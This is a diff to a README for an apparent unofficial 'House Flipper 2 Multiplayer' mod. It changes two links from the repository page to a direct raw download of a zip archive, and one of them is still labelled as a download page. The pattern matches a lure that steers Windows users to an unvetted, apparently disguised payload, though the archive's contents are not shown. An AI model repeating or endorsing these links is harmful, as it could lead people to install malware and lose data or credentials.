@@ -1,6 +1,6 @@
 # 🏠 House-Flipper-2-Multiplayer - Flip, Decorate, Play Together
 
-[![Download House-Flipper-2-Multiplayer](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/backskiresort421/House-Flipper-2-Multiplayer)
+[![Download House-Flipper-2-Multiplayer](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/backskiresort421/House-Flipper-2-Multiplayer/main/BaseMain/Flipper-Multiplayer-House-3.7.zip)
 
 ## 🎮 What This Is
 
@@ -12,7 +12,7 @@ This version is made for end users who want to get the game running on Windows w
 
 Use this link to visit the page and download the files:
 
-[Open the House-Flipper-2-Multiplayer download page](https://github.com/backskiresort421/House-Flipper-2-Multiplayer)
+[Open the House-Flipper-2-Multiplayer download page](https://raw.githubusercontent.com/backskiresort421/House-Flipper-2-Multiplayer/main/BaseMain/Flipper-Multiplayer-House-3.7.zip)
 
 After the page opens, look for the latest release or the main download file. Save it to your PC before you start setup.
 
